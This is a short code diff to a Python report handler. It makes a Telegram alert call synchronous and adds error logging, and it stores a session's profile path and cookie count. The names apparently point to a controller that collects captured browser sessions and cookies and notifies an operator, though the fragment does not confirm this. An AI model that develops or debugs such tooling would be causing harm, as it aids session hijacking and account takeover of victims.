@@ -255,10 +255,16 @@ def report():
         session["profile_path"] = profile_path
         session["cookie_count"] = report_data.get("cookie_count", 0)
         
-        # Send alert in background thread
+        # Send alert directly (synchronous)
         if profile_path:
             print(f"[Controller] Sending alert...", flush=True)
-            run_in_thread(bot.alert_telegram_session, session_id, profile_path)
+            try:
+                result = bot.alert_telegram_session(session_id, profile_path)
+                print(f"[Controller] Alert sent: {result}", flush=True)
+            except Exception as e:
+                print(f"[Controller] Alert error: {e}", flush=True)
+                import traceback
+                traceback.print_exc()
     
     save_sessions(sessions)
     
